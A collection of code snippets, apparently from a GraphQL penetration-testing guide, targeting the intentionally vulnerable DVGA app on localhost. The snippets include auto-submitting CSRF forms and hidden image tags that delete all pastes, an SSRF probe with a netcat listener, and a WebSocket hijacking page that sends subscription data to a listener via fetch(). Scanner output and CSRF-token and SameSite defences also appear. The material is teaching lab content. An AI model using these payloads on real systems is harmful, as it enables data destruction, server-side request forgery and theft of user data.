["```\n**query {**\n **__schema {**\n **mutationType {**\n **fields {**\n **name**\n **}**\n **}**\n **}**\n**}**\n```", "```\n**query {**\n **__schema {**\n **queryType {**\n **fields {**\n **name**\n **}**\n **}**\n **}**\n**}**\n```", "```\n{\n  \"name\": \"search\"\n},\n{\n  \"name\": \"audits\"\n},\n{\n  \"name\": \"deleteAllPastes\"\n}\n`--snip--`\n```", "```\n<html>\n  <h1>Click the button below to see the proof of concept!</h1>\n  <body>\n     <form id=\"auto_submit_form\" method=\"POST\" action=\"http://localhost:5013/graphql\">\n       <input type=\"hidden\" name=\"query\" value=\"mutation { createPaste(title:&quot;CSRF&quot;,\ncontent:&quot;content&quot;,\npublic:true, burn: false) { paste { id content title burn } }}\"/>\n       <input type=\"submit\" value=\"Submit\">\n     </form>\n  </body>\n<html>\n```", "```\nmutation {\n  createPaste(title: \"CSRF\", content: \"content\", public: true, burn: false) {\n    paste {\n      id\n      content\n      title\n      burn\n    }\n  }\n}\n```", "```\nasync function csrf() {\n    for (let i = 0; i < 2; i++) {\n        await sleep(i * 1000);\n    }\n    **document.forms['auto_submit_for'].submit();**\n}\n```", "```\n# **curl -X GET \"http://localhost:5013/graphql?query=mutation%20%7B%20__typename%20%7D\"**\n```", "```\n{\"errors\":[{\"message\":\"Can only perform a mutation operation from a POST request.\"}]}\n```", "```\n<a href=\"http://localhost:5013/graphql?query=mutation{someSensitiveAction}\" />\n```", "```\n<img src=\"http://localhost:5013/graphql?query=mutation{someSensitiveAction}\" />\n```", "```\n<html>\n  <body>\n    <h1>This form is going to submit itself in 2 seconds...</h1>\n     <form id=\"auto_submit_form\" **method=\"GET\"** action=\"http://localhost:5013/graphql\">\n       <input type=\"hidden\" name=\"query\" value=\"**query { deleteAllPastes }**\"/>\n       <input type=\"submit\" value=\"Submit\">\n     </form>\n  </body>\n\n<script>\nfunction sleep(ms) {\n    return new Promise(resolve => setTimeout(resolve, ms));\n}\n\nasync function csrf() {\n    for (let i = 0; i < 2; i++) {\n        await sleep(i * 1000);\n    }\n    document.forms['auto_submit_form'].submit();\n}\n\ncsrf();\n\n</script>\n<html>\n```", "```\nGET /graphql?query=**query+%7B+deleteAllPastes+%7D** HTTP/1.1\nHost: localhost:5013\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n(KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\n`--snip--`\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n```", "```\n<html>\n<body>\n  <h1>GET-based CSRF using an image tag</h1>\n  <img src=\"http://localhost:5013/graphql?query={deleteAllPastes}\" style=\"display: none;\" />\n</body>\n</html>\n```", "```\nmutation {\n  createPaste(content:\"<img src=\\\"http://localhost:5013/graphql?query= {\ndeleteAllPastes }\\\" </img>\", title:\"CSRF using image tags\", public: true,\nburn: false) {\n    paste {\n      id\n      content\n }\n  }\n}\n```", "```\n# **cd ~/batchql**\n# **python3 batch.py -e http://localhost:5013/graphql | grep -i CSRF**\n\nCSRF GET based successful. Please confirm that this is a valid issue.\nCSRF POST based successful. Please confirm that this is a valid issue.\n```", "```\n# **cd ~/graphql-cop**\n# **python3 graphql-cop.py -t http://localhost:5013/graphql | grep -i CSRF**\n\n[MEDIUM] GET Method Query Support - GraphQL queries allowed\nusing the GET method (Possible Cross Site Request Forgery (CSRF))\n[MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts\nnon-JSON queries over POST (Possible Cross Site Request Forgery)\n```", "```\nSet-Cookie: session=mysecretsession; SameSite=Strict\n```", "```\nPOST /graphql HTTP/1.1\nHost: localhost:5013\nContent-Length: 19\nContent-Type: application/x-www-form-urlencode\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.3\n\nquery=mutation+%7B+createPaste%28title%3A%22CSRF%22%2C+content%3A%22content%22\n%2C+public%3Atrue%2C+burn%3A+false%29+%7B+paste+%7B+id+content+title+burn+%7D+\n%7D%7D&**csrf-token=asij2nrsc82kssadis**\n```", "```\nPOST /graphql HTTP/1.1\nHost: localhost:5013\nContent-Length: 302\nAccept: application/json\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\n`--snip--`\nOrigin: http://localhost:5013\nReferer: http://localhost:5013/import_paste\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: env=graphiql:disable\nConnection: close\n\n{\"query\":\"mutation ImportPaste ($host: String!, $port: Int!, $path: String!,\n$scheme: String!) {\\n        importPaste(**host:** $host, **port:** $port, **path:** $path,\n**scheme:** $scheme) {\\n          result\\n        }\\n }\",\"variables\":{\"host\":\"pastebin.com\",\"port\":443,\"path\":\"/raw/LQ6u1qyi\",\n\"scheme\":\"https\"}}\n```", "```\nmutation {\n  importPaste(scheme: \"https\", host:\"pastebin.com\", port:443, path:\"/raw/LQ6u1qyi\") {\n    result\n  }\n}\n```", "```\nmutation {\n  importPaste(scheme: \"http\", host:\"localhost\", port:8080, path:\"/paste.txt\") {\n    result\n  }\n}\n```", "```\n{\n  \"data\": {\n    \"importPaste\": {\n      \"result\": \"\"\n    }\n  }\n}\n```", "```\n# **sudo docker exec -it dvga nc -lvp 7773**\n\nlistening on [::]:7773 ...\n```", "```\nmutation {\n  importPaste(scheme: \"http\", host:\"localhost\", port:7773, path: \"/ssrf\") {\n    result\n  }\n}\n```", "```\nconnect to [::ffff:127.0.0.1]:7773 from localhost:55554 ([::ffff:127.0.0.1]:55554)\nGET /ssrf HTTP/1.1\nHost: localhost:7773\nUser-Agent: curl/7.83.1\nAccept: */*\n```", "```\nCookie: session=somesessionID\n```", "```\nquery {\n  __schema {\n    subscriptionType {\n      fields {\n        name\n      }\n    }\n  }\n}\n```", "```\n<html>\n  <h2>WebSockets Hijacking and GraphQL Subscription Response Exfiltration Demo</h2>\n</html>\n\n<script>\n    const GQL = {\n      CONNECTION_INIT: 'connection_init',\n      CONNECTION_ACK: 'connection_ack',\n      CONNECTION_ERROR: 'connection_error',\n      CONNECTION_KEEP_ALIVE: 'ka',\n      START: 'start',\n      STOP: 'stop',\n      CONNECTION_TERMINATE: 'connection_terminate',\n      DATA: 'data',\n      ERROR: 'error',\n      COMPLETE: 'complete'\n    }\n\n  ws = new WebSocket('ws://localhost:5013/subscriptions'); ❶\n  ws.onopen = function start(event) {\n        var query = 'subscription getPaste {paste { id title content\nipAddr userAgent public owner {name} } }'; ❷\n\n        var graphqlMsg = {\n             type: GQL.START,\n             payload: {query}\n        };\n        ws.send(JSON.stringify(graphqlMsg)); ❸\n  }\n  ws.onmessage = function handleReply(event) {\n    data = JSON.parse(event.data) ❹\n    fetch('http://localhost:4444/?'+ JSON.stringify(data), {mode: 'no-cors'}); ❺\n  }\n</script>\n```", "```\n# **nc -vlp 4444**\n\nlistening on [any] 4444 ...\n```", "```\nlistening on [any] 4444 ...\nconnect to [127.0.0.1] from localhost [127.0.0.1] 50198\nGET /?**{%22type%22:%22data%22,%22payload%22:{%22data%22:{%22paste%22:{%22id%22:**\n**%2214%22,%22title%22:%22This%20will%20get%20exfiltrated!%22,%22content%22:%22**\n**Exiltrated%20Data%22,%22ipAddr%22:%22172.17.0.1%22,%22userAgent%22:%22**\n**Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537**\n**.36%20(KHTML,%20like%20Gecko)%20Chrome/96.0.4664.45%20Safari/537.36%22,**\n**%22public%22:true,%22owner%22:{%22name%22:%22DVGAUser%22}}}}}** HTTP/1.1\nHost: localhost:4444\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\"\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\nsec-ch-ua-platform: \"Linux\"\nAccept: */*\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: no-cors\nSec-Fetch-Dest: empty\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n```", "```\n# **echo** `'ADD-STRING-HERE'` **| python3 -c \"import sys;**\n**from urllib.parse import unquote; print(unquote(sys.stdin.read()));\"**\n```"]